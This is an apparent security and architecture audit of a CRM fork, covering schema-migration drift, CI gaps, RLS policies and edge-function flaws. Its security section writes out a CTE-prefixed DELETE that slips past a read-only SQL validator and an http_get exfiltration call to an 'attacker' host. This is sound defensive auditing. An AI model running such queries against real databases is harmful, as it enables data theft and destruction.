# Baseline Report — AI Company OS, Phase 0

**Date:** 2026-09-10. **Re-verified 2026-09-11** — see [Verification pass](#verification-pass-2026-09-11).
**Repository:** fork of [marmelab/atomic-crm](https://github.com/marmelab/atomic-crm) at `github.com/yurizache-cpu/atomic-crm`
**Commit audited:** originally `a863e2a0`; re-verified against `729f5966` (branch `feature/clinical-phase-1`, **4 commits ahead of `origin/main`, 0 behind**, and **never pushed**).
**Working tree:** clean. The ~41-file change set this report was written against is now committed as `652784b3`, `103e0294`, `2b5f20bb`, `729f5966`.
**Method:** 21 parallel inspection and adversarial-verification agents over the whole repository, plus direct verification of every load-bearing claim below. A second 77-agent pass on 2026-09-11 re-checked every claim against the new HEAD.

> **Language:** this document is in English because `.claude/rules/english-only.md` is an in-force repository rule that mandates English for source, Markdown docs, agent prompts and default config values. The prior product docs under `docs/product/` are Portuguese and therefore already violate that rule. See [Open questions](#13-open-questions), Q1.

---

## 0. Read this first — the three facts that matter most

These are separate findings that are only meaningful together. Each was verified directly.

1. **A push to `main` deploys without passing CI.** `.github/workflows/deploy.yml:2-5` triggers on push to `main` and carries no `needs:` dependency on `check.yml`. Typecheck, lint, unit tests and e2e run *in parallel with* the deploy, not before it. A red build ships.

2. **The entire schema and security rewrite reaches no database.** All seven files in `supabase/schemas/` are modified — three new tables, a 43-policy RLS rewrite, new grants, storage lockdown. (They are now *committed* in `103e0294`; committing moved them **zero** distance toward a database, which is the point.) `supabase/migrations/` contains **none** of it, and `supabase db push` (the only path to production, `deploy.yml:149`) applies migrations only. The deeper cause: `supabase/config.toml` **has no `[db.migrations] schema_paths` key**, so the declarative workflow that `AGENTS.md:33` documents as the source of truth is not actually wired to the CLI. Verified: `grep -n "schema_paths\|\[db.migrations\]" supabase/config.toml` → no match.

3. **Consequently, a deployed instance would be locked out for everyone.** The SPA and the edge functions *do* deploy (they need no migration). `src/components/atomic-crm/providers/supabase/authProvider.ts:61` selects `sales.role` — a column that exists in `supabase/schemas/01_tables.sql:118` and in **zero migrations** (verified). Every login would fail with PostgREST error 42703, which `authProvider.ts:66` interprets as a disabled account and `:119` reports to the user as *"Your account is disabled or has not been provisioned."*

> **Confirmed by the owner, 2026-09-10: no hosted Supabase project exists yet — development is local-only.** This is the single most fortunate fact in the report. Fact 3 is therefore a **latent trap that fires on first deploy**, not a live outage, and every critical security finding in §7 can be fixed *before* any real clinical data exists. That window is the reason Phase 0.5 and Phase 1 are cheap now and expensive later.

The half of the change set that can deploy, deploys. The half that cannot, does not. The result is worse than either alone.

**Immediate corollary — the work is unbacked.** ~~~1,480 changed lines plus ~800 lines of untracked new files exist only in a working tree, with nothing staged and an empty stash. One `git clean`, one bad rebase, or one disk failure and Phase 0 is gone.~~ **Superseded 2026-09-11:** the work is committed (4 commits), so `git clean` is no longer a threat. It is **still not pushed** — `feature/clinical-phase-1` has no upstream, `origin` carries only `main` at the pre-fork `a863e2a0`, and therefore **no CI run has ever executed against any of these commits**. The custody risk shrank from "one `git clean`" to "one disk failure", and the validation risk grew: the first push will put ~2,300 unreviewed lines through `check.yml` at once. See [§10](#10-migration-strategy) — `git push -u origin feature/clinical-phase-1` is the first thing to do, ahead of any architecture work.

---

## 1. Current architecture

A single-tenant, browser-only CRM SPA talking to a managed Supabase backend. There is **no server-side process that outlives an HTTP request** anywhere in the repository.

```
Browser (React 19 SPA, static files on GitHub Pages)
   │
   ├── ra-core dataProvider ──► PostgREST  ──► Postgres (public schema, RLS)
   ├── supabase-js auth      ──► GoTrue
   ├── supabase-js storage   ──► Storage (attachments bucket)
   └── functions.invoke()    ──► 6 Deno Edge Functions (per-request isolates)
                                    │
                                    └── service-role client / direct pg Pool
```

| Layer | State |
| --- | --- |
| Frontend | Vite 7 + React 19 SPA. `src/main.tsx` → `src/App.tsx` → `<CRM />`. Three layers: `src/components/ui/` (35 shadcn files, ~3.5k LOC), `src/components/admin/` (87 shadcn-admin-kit files, ~11.8k LOC — a generic headless CRUD toolkit over `ra-core`), `src/components/atomic-crm/` (18 subfolders, 260 files, ~25.8k LOC — the CRM domain). |
| Routing | Not a routes file. `<Resource>` and `<CustomRoutes>` are literal JSX inside `root/CRM.tsx:243-266` (desktop) and `:302-327` (mobile). |
| Desktop/mobile | Two separate application trees chosen at render time by `useIsMobile()` (one call, `CRM.tsx:167`; the branch itself is `:215`). Crossing the 768px breakpoint unmounts and remounts the whole app. |
| Data access | One react-admin `DataProvider` from `providers/supabase/dataProvider.ts`, wrapping `ra-supabase-core` → `@raphiniert/ra-data-postgrest`. 9 CRUD methods + 9 custom methods + `withLifecycleCallbacks` over 6 resource entries carrying 9 callbacks (FakeRest registers 8 entries). A second implementation for FakeRest powers the offline demo. |
| Backend compute | 6 Deno Edge Functions (`users`, `update_password`, `merge_contacts`, `delete_note_attachments`, `postmark`, `mcp`), ~3,500 LOC. All declared `verify_jwt = false`. |
| Database | Postgres. 13 tables, 4 views, 22 functions, 15 triggers, 43 RLS policies, 10 indexes — all in `public`, plus an empty `private` schema created at `01_tables.sql:11`. |
| Config | Runtime domain options live in a single JSONB row (`configuration`, pinned by `check (id = 1)`) mirrored into a browser `localStorage` blob under key `app.configuration`. |
| Deployment | GitHub Actions on push to `main`: `supabase db push` + `supabase functions deploy` + `gh-pages` publish of `dist/`. No container, no worker, no scheduler, no queue. |

### What the fork has already changed

The fork is not a clean checkout of upstream. Committed on `feature/clinical-phase-1` (`103e0294`, `2b5f20bb`) but **backed by no migration**, so none of it reaches a database:

- **Schema:** new tables `lead_profiles`, `acquisition_attributions`, `loss_reasons`; six new `deals` columns (`pipeline_stage`, `stage_entered_at`, `loss_reason_id`, `lost_at`, `converted_at`, `next_action_at`); new column `sales.role`; a nine-value psychology-clinic CHECK constraint at `01_tables.sql:86-96`; eight new functions; three new triggers.
- **Security:** RLS rewritten from upstream's permissive `using (true)` to per-`sales_id` scoping through six SECURITY DEFINER helpers — five new at `02_functions.sql:462-509` (`current_sales_id`, `is_active_sales_user`, `can_manage_sales_id`, `can_access_contact`, `can_access_deal`) plus the inherited `is_admin()` at `:265`; `anon` grants revoked (`06_grants.sql:8-12`) with a default-deny footer (`:62-67`); attachments bucket **declared** private and its policies dropped. ⚠️ That last one is declaration only: `07_storage.sql:8` is `update storage.buckets set public = false` — **DML, not DDL**, so `supabase db diff` can never emit it no matter how `schema_paths` is configured. In every database built from migrations the bucket is still `public = true` with three open `authenticated` policies (`20240730075029_init_db.sql:555-562`). Closing it needs a **hand-written** migration.
- **Product:** BRL currency, the title "CRM Comercial", nine Portuguese funnel stages hardcoded in `root/defaultConfiguration.ts:11-41`; pt-BR string literals scattered directly into components; the Companies tab removed from navigation while `<Resource name="companies">` stays registered; file uploads disabled; the first-user bootstrap UI deleted from `StartPage.tsx`.

---

## 2. Current stack

| Concern | Choice | Notes |
| --- | --- | --- |
| Language | TypeScript ~5.8.3 | `tsconfig.app.json:35` includes only `src`, `demo`, `vitest-browser.d.ts`. `e2e/`, `supabase/functions/`, `.claude/`, `scripts/` and the config files are typechecked by **nothing**. |
| UI | React 19.1, Tailwind 4, Radix / shadcn, `lucide-react`, `@nivo/bar` | |
| Admin framework | `ra-core` 5.14.7 + shadcn-admin-kit (vendored, not a dependency) | |
| Backend SDK | `ra-supabase-core` 3.5.2; `@raphiniert/ra-data-postgrest` 2.5.1 is **transitive only** | So PostgREST wire syntax is a de-facto public API with no declared dependency. |
| Build | Vite 7, `vite-plugin-pwa`, `rollup-plugin-visualizer` | |
| Validation | `zod` ^4.1.12 declared — **imported in exactly one file**, `supabase/functions/mcp/index.ts:6`, which pins `zod@^3.25`. A major-version split. |
| Database | Postgres via Supabase; extensions `http`, `citext` declared; `pg_net`, `pgjwt` exist only in migrations | |
| Testing | Vitest 4 (three projects), Playwright 1.60 (4 e2e specs), Storybook 9 | |
| Runtime (server) | **None.** No Express/Fastify/Hono; the only Dockerfile is `.devcontainer/Dockerfile`. | |
| Node | v22.23.1 local. No `engines` field in `package.json`; `.nvmrc` is read by neither CI workflow. | |

**Integrations that exist:** inbound email (Postmark) and outbound favicon fetching. That is all. A repo-wide grep for `whatsapp|twilio|stripe|calendly|google.calendar|mercadopago|pagarme` across `src`, `supabase` and `scripts` returns zero files.

---

## 3. Existing database model

13 tables, all in `public`, all `bigint generated by default as identity` except `configuration` (`integer`, pinned to 1).

| Table | Role |
| --- | --- |
| `sales` | Identity + authorization. FK `user_id uuid → auth.users`. Carries `administrator boolean`, `role text check (role in ('owner','operator'))`, `disabled boolean`. |
| `companies` | CRM **customer accounts** — *not* tenants. |
| `contacts` | People. `email_jsonb` / `phone_jsonb` arrays, `tags bigint[]`. |
| `deals` | Opportunities. `contact_ids bigint[]`, `stage text`, plus the fork's `pipeline_stage` CHECK. |
| `tasks` | Human to-dos. `contact_id bigint **not null**`. |
| `contact_notes`, `deal_notes` | Free text + attachments. |
| `tags`, `favicons_excluded_domains` | Lookups. |
| `configuration` | Singleton JSONB settings blob. |
| `lead_profiles`, `acquisition_attributions`, `loss_reasons` | Fork additions (unmigrated). |

Views: `activity_log`, `companies_summary`, `contacts_summary`, `init_state` — all `security_invoker`.

### Structural facts that constrain everything downstream

- **No tenant discriminator exists.** No `company_id`, `tenant_id`, `org_id` or `workspace_id` on any table. The only scoping axis is `sales_id` — a *per-user* column — baked into 43 policies and 6 helper functions. Note the name collision: `company_id` already means "CRM customer account".
- **No audit or event table.** `activity_log` (`03_views.sql:6-72`) is a `UNION ALL` **view** over `created_at` columns that can only ever emit `<entity>.created`. Updates are invisible; a deleted row erases its own history. It will be mistaken for an audit log.
- **Timestamp coverage is thin.** 9 of 13 tables have no `created_at`, 10 have no `updated_at`, 6 have no timestamp at all. Even a naive reconstruction of history is impossible.
- **Referential integrity is partly delegated to array columns** (`contacts.tags`, `deals.contact_ids`) with no FK and no GIN index.
- **No index on `sales_id` on any table**, while every RLS predicate filters on it through a SECURITY DEFINER function call.
- **12 of 22 functions are SECURITY DEFINER** — that is the inherited privilege surface.
- **No table uses `force row level security`**, so the table owner (`postgres` — the role the MCP function's connection pool uses) bypasses every policy.
- Two schemas exist, not one: `private` is created empty at `01_tables.sql:11`. This is the repo's only proof that `create schema` survives the declarative workflow.
- `supabase/config.toml:11` exposes schemas to PostgREST by **explicit allowlist** (`public`, `storage`, `graphql_public`) — a ready-made hard boundary for anything that must not be browser-reachable.

---

## 4. Existing CRM capabilities

Genuinely working and worth keeping: contacts, companies, deals with a Kanban pipeline, tasks, notes (contact + deal), tags, a sales/user directory, CSV import with mapping, an activity feed, a configurable-options settings page, full-text search over contacts and companies, an offline FakeRest demo mode, PWA install with a precaching service worker, and desktop + mobile UIs.

The `dataProvider` exposes 9 custom methods beyond CRUD: `signUp`, `salesCreate`, `salesUpdate`, `updatePassword`, `unarchiveDeal`, `isInitialized`, `mergeContacts`, `getConfiguration`, `updateConfiguration`. Three of them are unreachable dead code (`updateConfiguration` has zero callers outside the provider).

**Domain options are genuinely runtime-configurable** — stages, categories, note statuses, task types, sectors, currency, title, logos all live in the `configuration` JSONB blob and are editable in Settings. This is the repo's existing "configuration, not hardcode" precedent, and it is the right shape. The fork has partly abandoned it by hardcoding pt-BR literals into components (`DealsChart.tsx:21-22` replaced configurable stage lookups with the literals `"Continuidade convertida"` / `"Perdida"`).

---

## 5. Reusable components

Ordered by how much they are worth.

| Asset | Evidence | Why it survives |
| --- | --- | --- |
| **Deny-by-default grants pattern** | `06_grants.sql:8-12`, `:62-67` | The one security primitive that generalizes. Caveat: scoped `for role postgres` **and** `in schema public`, so it must be re-declared per schema and per creating role. Not automatic. |
| **RLS helper-function indirection** | `02_functions.sql:462-511`, used by all 43 policies | Correct shape for tenant predicates: policies call a function instead of inlining a predicate. |
| **`security_invoker` views as read models** | `03_views.sql:6,74,102,146` | Aggregate in the database, not the browser. |
| **JWKS JWT verification middleware** | `_shared/authentication.ts:6-30`; `mcp/index.ts:57-80` | A working, standards-shaped agent authentication path. Keep the auth; discard the tools it guards. |
| **Per-transaction RLS downgrade** | `mcp/index.ts:220-237` | `BEGIN; set_config('role','authenticated',true); set_config('request.jwt.claims',…,true); … COMMIT` — parameterized, deliberate, correct. |
| **AST-based SQL allowlist** | `mcp/validateSql.ts` + its tests | Incomplete (see §7) but the only thing standing between a model and `DROP TABLE`. Extend, do not rewrite. |
| **DB trigger → `pg_net` → Edge Function** | `02_functions.sql:34-45` | The only working async primitive in the repo, and the seed of an outbox. It already exhibits the exact failure modes to design against. |
| **`.claude/adapters/supabase/manifest.json`** | 30 lines | The closest thing in the repo to the `CRMProvider` design the brief demands: a declared capability with detect/generate/apply/review/guard hooks, active *iff* its config block exists. **Copy this shape.** |
| **Harness policy-gate patterns** | `.claude/hooks/` (~4.2k LOC) | A real maker-checker (`block-merger-without-review.mjs` refuses a merge until a review flag exists), a real circuit breaker (`circuit-breaker.mjs:27`, `ITERATION_LIMIT = 45`), a real per-role model router (`harness.config.json:84-97`). Port the *shapes*; **invert the fail-open defaults**. |
| **shadcn-admin-kit + guessers** | `src/components/admin/` (79 exports), `list-guesser.tsx`, `edit-guesser.tsx` | This is how Phase-1's deliberately ugly Agents/Tasks/Events/Decisions/Approvals/Costs screens get built in hours instead of weeks. |
| **Disposable-Supabase e2e harness** | `config.e2e.toml`, `.env.e2e`, `makefile:63-81` | The only place tests touch real Postgres. Load-bearing for CI. |
| **`supabase/schemas/` file-per-concern layout** | 7 files | Reviewable and diffable — **conditional on D6 in §9 being resolved.** |

---

## 6. Technical debt

- **Schema/migration divergence.** The headline item; see §0. Additionally the drift runs *both* ways: migrations create `pgjwt` and `pg_net`, which the declarative schema does not declare. (An earlier version of this bullet also claimed `20251204201317` dropped a `merge_contacts` SQL function that the next diff would resurrect. **Corrected 2026-09-11:** two later migrations re-create it — `20260115150819_snake_case_renaming.sql:7` and `20260309112831_fix_security_warnings.sql:186` — so migrations and the declarative schema agree that it exists.)
- **The pending migration is not additive — it rewrites a view the CRM already depends on.** `03_views.sql`'s `contacts_summary` now `LEFT JOIN`s `public.lead_profiles` and a `LATERAL` over `public.acquisition_attributions`, neither of which exists in any migration, and adds 8 columns. The same file silently flipped `init_state` from `security_invoker = off` to `on` — a security-posture change to the one view the login page reads *before* authentication, and `20260601120000_grant_init_state_to_api_roles.sql` granted access to it assuming the old definer behaviour.
- **Three fork resources are live in the UI but registered nowhere.** `lead_profiles`, `acquisition_attributions` and `loss_reasons` are used as literal react-admin resource names (`contacts/LeadCommercialPanel.tsx:25,34,80`, `tasks/TaskCreateSheet.tsx:58,67`, `deals/DealInputs.tsx:108-111`), but no `<Resource name=…>` registers any of them and the FakeRest generator creates no matching collections. `npm run dev:demo` therefore renders these screens against a store that has no such data, and Supabase requests hit tables that exist in `supabase/schemas/` and in zero migrations.
- **The fork's 65-file change set added zero tests.** `git diff --stat a863e2a0..HEAD -- "*.test.ts" "*.test.tsx" "e2e/*"` is empty. Three new tables, the 43-policy RLS rewrite, the deny-by-default grants, the pipeline funnel and one new 163-line component all shipped untested.
- **Two contradictory, both-documented migration processes.** `AGENTS.md:33,36` prescribes `supabase db diff` from `supabase/schemas/`; `.claude/skills/writing-migrations/SKILL.md` hand-authors SQL from the TypeScript diff. Neither is enforced, and the declarative one is not even configured.
- **`supabase db reset` is broken right now.** `seed.sql:105` inserts into `loss_reasons`, which no migration creates. Local reset, `supabase start`, and the e2e CI bootstrap all fail.
- **The e2e suite is red for at least three independent reasons**: the seed failure above; `onboarding.spec.ts` drives the signup flow this branch deleted; and every fixture user is created without `role`, so all of them fail the new `is_admin()` gate.
- ~~**Typecheck and lint are red** — 5 and 2 errors respectively~~ ✅ **Fixed in `2b5f20bb`.** Both gates pass as of 2026-09-11 (see §15).
- **`npm run build` does not typecheck.** `package.json:11` is `"tsc && vite build"`, but `tsconfig.json` is a solution-style config (`"files": []` + `references`), so bare `tsc` compiles nothing. Build is effectively `vite build` and is always green. The only real gate is `npm run typecheck`.
- **The harness's own build loop is unreliable.** It smoke-tests against FakeRest (`harness.config.json:66`, `demoMode: true`), scopes unit tests to changed files, and 47 of its own tests fail on this machine. Two corrections (2026-09-11): the scoping is not a bare `--changed` — `validation.mjs:80-84` passes an explicit session-base ref and falls back to a full run on an empty ref — but the residual risk (a ticket touching files no test imports runs nothing) is real. And the 47 failures are **not** primarily "worktree/symlink" problems: the dominant cause is `.claude/hooks/lib/paths.mjs:22-24`, whose `sanitizePath()` replaces only `/`, so a Windows absolute path keeps its `C:` and `\` and is then embedded as a middle path segment by `context.mjs:35` — every `mkdir` against it throws `ENOENT`. Fixing symlinks alone will not turn the project green.
- **The harness cannot apply migrations on a cold machine, for the same reason `db reset` fails.** `.claude/scripts/apply-migrations.mjs:145-151` falls back to `npx supabase start`, and with no `[db.seed]` block in `config.toml` the CLI runs `supabase/seed.sql`, which fails at line 105 on the non-existent `loss_reasons`. The automation meant to package the Phase 0.5 migration is blocked by the defect that migration is meant to fix — so `seed.sql` must be fixed by hand, first, outside the harness.
- **`npm run registry:gen` destroyed `registry.json` on Windows.** *(Found and fixed 2026-09-11.)* `scripts/generate-registry.mjs` built its glob patterns with `path.join`, which emits backslashes on Windows; `glob` treats `\` as an escape character, so every pattern matched nothing and the generator rewrote `registry.json` with **1 file instead of 223** — silently, exit 0. This is why the registry was stale (`LeadCommercialPanel.tsx` missing): the step had not run successfully in some time, and any Windows developer who *did* run it would have wiped the file. Fixed by switching the glob patterns to `path.posix.join`; the generator now emits 224 files. **Note what this implies:** the next successful `registry:gen` adds `LeadCommercialPanel.tsx` to the published registry, which is exactly the exposure [ADR 0008](adr/0008-fork-posture.md) exists to decide. `registry.json` has deliberately been left at its committed state pending that decision.
- **`.husky/pre-commit` blocks every commit on this machine.** Line 1 is `make registry-gen`, and `make` is not installed (verified). Husky aborts the commit with `pre-commit script failed (code 127)` — it does **not** continue to `npx lint-staged`. Confirmed empirically: a commit attempt was rejected and `HEAD` did not move. Any Windows developer without `make` therefore cannot commit at all. Related: `registry.json` is already stale (`LeadCommercialPanel.tsx` is absent from its 223 files), because the step has not run successfully in some time.
- **The fork publishes its own domain code.** `registry.json` contains one item with 223 files, **214 of them under `src/components/atomic-crm`**, republished to gh-pages on every push to `main` (`deploy.yml:44,50`). Two refinements (2026-09-11): (a) publication reads the *committed* `registry.json` — `npx shadcn build` compiles the listed paths and never rescans the tree — so a **new** file becomes public only after `registry:gen` runs and the regenerated JSON is committed; but (b) the 32 **modified** `atomic-crm` files (pt-BR clinic vocabulary, pipeline stages, `authProvider`) are already listed, so their new content republishes verbatim on the next push to `main` with no regeneration needed. (c) It has never actually fired: `git ls-remote --heads origin` shows only `main`, and the fork has no `gh-pages` branch. This is a **latent trigger**, which makes [ADR 0008](adr/0008-fork-posture.md)'s "stop publishing" a cheap pre-emptive fix rather than a retraction of already-public code.
- **The fork's own docs tell the reader to overwrite the fork.** `doc/src/content/docs/developers/getting-updates.mdx:15-17` instructs `npx shadcn add https://marmelab.com/atomic-crm/r/atomic-crm.json -o -y` and explains that `-o` "replaces local files with the upstream version" — which would replace all 214 registered `src/components/atomic-crm/**` files, including every clinical change. `doc/` is 93 tracked files, a second npm project with its own lockfile, built and pushed to the fork's gh-pages on every push to `main` with no `if:` guard and zero CI coverage.
- **Reverse dependency in the vendored layer.** `src/components/admin/login-page.tsx:8` and `src/components/supabase/layout.tsx:3` import `useConfigurationContext` from `atomic-crm`. This is in the committed tree, from upstream. `src/components/admin` is therefore not a drop-in generic kit.
- **Governance conflict.** `AGENTS.md:105-107,189` says modify `src/components/admin` and `src/components/ui` freely; `docs/product/07-upstream-strategy.md:30` says avoid them. `CLAUDE.md` `@`-imports `AGENTS.md`, so an agent follows the riskier rule. Settleable on the evidence: `registry.json` lists 214 `atomic-crm` files and **zero** `admin`/`ui` files — those two directories are inbound registry content. **07-upstream-strategy wins.**
- **Dual source of truth for the funnel.** The fork added `pipeline_stage` alongside upstream's `stage` and left both on the type with `??` fallbacks through the Kanban code. `synchronize_deal_pipeline` (`02_functions.sql:539-559`) force-overwrites `stage` on every write, so any non-Atomic writer that sets `stage` has its write silently discarded.
- **`Contact` and `LeadProfile` are denormalized twins** — five lead fields on both types, read from both places.
- **Read/write model conflation.** `getOne("contacts")` transparently reads `contacts_summary`, so a form holds 12 columns that do not exist on `public.contacts`, with nothing stripping them before `update()`.
- Broken script wiring: `makefile:170,173,176` invoke `node scripts/harness-monitor.mjs`, which lives at `.claude/scripts/`. `make watch`/`monitor`/`sessions` all fail.
- No `license` field and no `"private": true` in `package.json` — a publish footgun on an MIT-derived commercial fork.

---

## 7. Security risks

### Critical

1. **Secrets are committed to git, by design.** `.gitignore:36` ignores `.env`; `.gitignore:42` then re-includes it with `!supabase/functions/.env`. Tracked today: `supabase/functions/.env` (Postmark webhook user/password), `.env.development`, `.env.e2e`, and **`supabase/signing_keys.json`, which contains the EC P-256 private scalar `d`**. The `SERVICE_ROLE_KEY` in `.env.e2e` is signed by that key and does not expire until ~2036. These are upstream's dev values — but the *mechanism* means any real secret written there commits by default, and an AI layer's provider keys (`ANTHROPIC_API_KEY`, WhatsApp tokens) would land in exactly that file.

2. **`delete_note_attachments` — any authenticated user can delete any file in the bucket.** `index.ts:57-59` wraps only `AuthMiddleware` (signature + issuer, nothing else) around a handler that reads storage paths from the request body and passes them to `supabaseAdmin.storage.remove()` with the **service-role key**. No owner check, no shared secret.

3. **The MCP edge function is an arbitrary-SQL endpoint.** It exposes `query` (arbitrary SELECT) and **`mutate` (arbitrary INSERT/UPDATE/DELETE)** to any holder of a signature-valid user JWT. Compounding factors, each verified:
   - The pool connects as `SUPABASE_DB_URL` with a hardcoded fallback of `postgresql://postgres:postgres@db:5432/postgres` — i.e. **superuser**. Since no table uses `force row level security`, that role bypasses every policy in the new model.
   - `jwtVerify` is called with `{ issuer }` alone — **no audience check**, so any Supabase-issued token for this project is accepted (confused deputy).
   - **`validateSql` never inspects the CTE's own main statement at all.** `collectStatementTypes` (`validateSql.ts:8-21`) reads `stmt.type` and `stmt.bind[].statement.type`, but never `stmt.in` — the statement the `WITH` is attached to. **Reproduced against the pinned parser, 2026-09-11:** `WITH x AS (SELECT 1 AS a) DELETE FROM contacts` collects `{with, select}` and is **ALLOWED** by the read-only gate, while `stmts[0].in.type === "delete"`. Same for `UPDATE` and `INSERT`. This is ordinary PostgreSQL — a CTE attached to a DML statement — not the exotic nested-`WITH` case the earlier draft described, and it turns the `readOnlyHint: true` `query` tool into a write primitive with one line of prefix. The fix is to recurse into `stmt.in` (and into nested `bind` statements).
   - **`validateSql` classifies statement *types* and never inspects function calls, while the grant hardening stops at `schema public`.** The network-capable `http` extension is installed in `extensions` (`01_tables.sql:7`) and already called from SQL (`02_functions.sql:72`), and neither `05_policies.sql` nor `06_grants.sql` contains the word `extensions`. A plain `SELECT extensions.http_get('https://attacker/?d='||…)` is a legal read-only SELECT that passes every gate — an SSRF and exfiltration primitive from inside the database that **no amount of RLS constrains**, reachable through the `query` tool by any holder of a signature-valid JWT.
   - OAuth metadata and the 401 challenge are built from the attacker-controllable `x-forwarded-host` header.
   - `get_schema` runs on the raw connection with no role downgrade, returning the full schema map.
   - Full SQL statements — including names, emails and note text — are logged verbatim (`:322`, `:377`). Under LGPD that is an uncontrolled secondary store of personal data.
   - The pool is size **1**, so the whole agent tool surface has a concurrency ceiling of one statement per isolate, and `pg_sleep` is an accepted SELECT.

4. **`users`/`patchUser` privilege-escalation ordering bug.** The fork tightened the second gate to `isOwner`, but `:206` still gates the self/other check on the bare `administrator` flag, and `:210` mutates the user's auth email and ban state **before** the owner check at `:227` runs.

5. **Frontend authorization is fail-open.** `providers/commons/canAccess.ts` (verified in full) returns `true` for admin, `false` for exactly two resources (`sales`, `configuration`), and **`return true`** for everything else. It is a deny-list, not an allow-list. Every future engine resource — agents, approvals, costs, decisions, audit — is readable and writable by any authenticated non-admin the moment it exists. It has **no test**.

5a. **`merge_contacts` silently destroys the fork's own new data, including a consent flag.** *(Found 2026-09-11.)* The fork added `lead_profiles.contact_id` and `acquisition_attributions.contact_id` with `on delete cascade` (`01_tables.sql:247,250`). The `merge_contacts` edge function re-points only `tasks` (`index.ts:110`) and `contact_notes` (`:117`) before `deleteFrom("contacts").where("id","=",loserId)` at `:151`. Merging a duplicate contact — a routine one-click CRM action — therefore permanently deletes the loser's entire lead profile, **including `do_not_contact`**, and every acquisition-attribution row (source/medium/campaign/gclid). Losing an opt-out flag silently is an LGPD incident, not a data-quality bug; losing attribution destroys the only reason `acquisition_attributions` exists. `AGENTS.md:168` names "don't forget the contact merge logic" as a required step for exactly this kind of schema change, and it was not done.

5b. **The Postmark webhook reports every ingestion failure to the provider as success.** *(Found 2026-09-11.)* `postmark/index.ts:119-132` calls `await addNoteToContact({…})` inside the contacts loop, **discards the return value**, and then returns `new Response("OK")`. `addNoteToContact` signals failure by *returning* a Response — 500 on a failed sales fetch (`:142-146`), 403 when the sender has no active sales row (`:150-154`), 500 on failed contact/company creation (`:183-187`), 500 on a failed note insert (`:199-203`). All four are swallowed and Postmark sees HTTP 200, so the message is never retried and the failure is never recorded. This is strictly worse than the 403-to-suppress-retries behaviour documented in `ARCHITECTURE.md` §8: that one at least fails loudly.

5c. **The owner/admin branch of the policy model is unreachable, so core CRM writes are dead.** *(Found 2026-09-11.)* Because no code path can set `role = 'owner'` (item 6), `is_admin()` is permanently false, and every policy gated on it evaluates false forever: `tags` insert/update/delete (`05_policies.sql:125-127`), `loss_reasons` (`:130-132`), `configuration_update_owner` (`:135`), `favicon_mutation_owner` (`:138`). `06_grants.sql:21,22,27` grant those verbs to `authenticated`, so the grant surface and the policy surface actively contradict each other. Tag creation and the settings write path are dead on any deployment of this schema — not only the lost-deal path recorded under item 6.

### High

6. **Bootstrap deadlock.** `is_admin()` requires `role = 'owner'`; `handle_new_user` hardcodes `administrator = false, role = 'operator'`; signup is disabled in three places in `config.toml`; `authenticated` has no INSERT/UPDATE policy on `sales`; the invite endpoint requires an existing owner; and the fork deleted the first-user bootstrap UI from `StartPage.tsx`. **No owner can be created by any path in the repository.** Downstream consequence: marking a deal lost is structurally impossible, because the CHECK requires a `loss_reason_id`, `loss_reasons` is populated only by `seed.sql`, and inserting into it requires `is_admin()`.
7. **Deployed `handle_new_user` still makes the first signup an administrator** (`20260128165057_sso_handling.sql:20-28`) — the schema fix is unmigrated. **Read items 6 and 7 together:** the deadlock in item 6 is a property of `supabase/schemas/` only. The sole `is_admin()` in `supabase/migrations/` (`20260211194545_app_configuration.sql:16-23`) tests `administrator = true` with no `role` and no `disabled` check, and the deployed trigger makes the first signup `administrator = TRUE` — so a database built by `supabase db push` or `db reset` has a working admin and no deadlock. What actually breaks such an instance is the `role` column in `authProvider.ts:61` (§0.3). Both states are broken; they are broken in *opposite* directions, and any fix must name which one it is fixing.
8. **Any `auth.users` row becomes an active CRM operator.** No pending/approval state. Anyone who obtains an account by any route gets write access to contacts and notes.
9. **Postmark webhook IP allowlist is spoofable.** `ips.some(ip => authorizedIPs.includes(ip))` over a client-supplied `X-Forwarded-For` that Supabase *appends* to. Combined with the committed Basic-auth password, the webhook's gates are both defeated.
10. **PostgREST filter injection** from inbound-email display names into `.or(\`website.eq.${website},name.eq.${companyName}…\`)`, executed as service role.
11. **Auth config hardening never reaches production.** The `enable_signup = false` flips live in `config.toml`; on a hosted project those settings live in the dashboard, and the pipeline never runs `config push`.
12. **Identity and role are cached in `localStorage` and revalidated only on logout.** Disabling a user or demoting an owner has no effect on an open session.

### Medium / notable

13. **Production sourcemaps and a bundle-analysis page are published to public gh-pages** (`vite.config.ts:64`, `deploy.yml:200-203`).
14. **A telemetry beacon fires on every production load** to `atomic-crm-telemetry.marmelab.com` with the deployment hostname. `App.tsx:34` renders `<CRM />` with no props, so `disableTelemetry` is `undefined`.
15. **CORS is `Access-Control-Allow-Origin: *`** on the shared helper (note: `delete_note_attachments` does not import it at all).
16. **`verify_jwt = false` on all six functions** — no platform-level auth layer, so one missing middleware call is a full bypass, which is exactly what happened in #2.
17. **No rate limiting, quota or cost ceiling** at any layer, including the two functions that execute arbitrary SQL and `update_password`, which sends an email per call.
18. **No prompt-injection defenses.** Notes written by the Postmark webhook are indistinguishable in the database from notes a human typed. There is no provenance or trust-level column.
19. **No supply-chain automation** in `.github/` — no Dependabot, no CodeQL, no secret scanning — on a repository that already has committed key material.
20. **Attachments are three-way inconsistent**: disabled in the UI (`dataProvider.ts:26,245,269` throw), still written by inbound email (`postmark/index.ts:101,126`, minting public URLs that cannot resolve), still deletable by any JWT holder, with the legitimate cleanup trigger uninstalled. One defect, not three. Attachment filenames are generated with `Math.random()`.

---

## 8. Missing infrastructure

Every capability the brief's sections 6–12, 28–34 and 46–47 require, checked by repo-wide grep across `src`, `supabase`, `scripts`, `e2e`, `.github` and `package.json`.

| Capability | Present? | Evidence |
| --- | --- | --- |
| Job queue / background jobs | **Absent** | `pgmq`, `bullmq`, `graphile`, `inngest`, `trigger.dev`, `temporal` → 0 hits |
| Scheduler / cron | **Absent** | `pg_cron`, `Deno.cron` → 0 hits; no `schedule:` in either workflow |
| Long-running compute | **Absent** | No server process; `EdgeRuntime.waitUntil` → 0 hits |
| Event bus / outbox | **Absent** | No `outbox`, no `pg_notify`/LISTEN, no `business_events`. Only fire-and-forget `pg_net` |
| Durable run/step state | **Absent** | No run, attempt or job table anywhere |
| LLM / AI SDK | **Absent** | `@anthropic-ai`, `openai`, `langchain`, `ai` → 0 hits |
| Model router | **Absent** | (the harness has one for *dev-time* roles: `harness.config.json:84-97`) |
| Cost / token accounting | **Absent** | `input_tokens`, `output_tokens`, `cost`, `spend` → 0 product hits |
| Memory / retrieval | **Absent** | `pgvector`, `embedding` → 0 hits |
